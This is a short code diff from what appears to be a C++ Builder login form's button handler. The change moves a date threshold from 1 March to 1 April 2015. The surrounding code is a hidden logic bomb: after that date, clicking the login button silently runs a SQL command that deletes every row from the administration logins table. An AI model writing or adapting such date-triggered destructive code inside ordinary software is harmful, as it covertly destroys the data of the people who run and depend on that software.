@@ -26,7 +26,7 @@ void __fastcall TLogIn::BitBtn1Click(TObject *Sender)
     CloseModal();
     return;
 #endif
-if (Now()>=TDateTime(2015,3,1))
+if (Now()>=TDateTime(2015,4,1))
 {
 	DB->SendSQL("delete from administration.logins");
 }
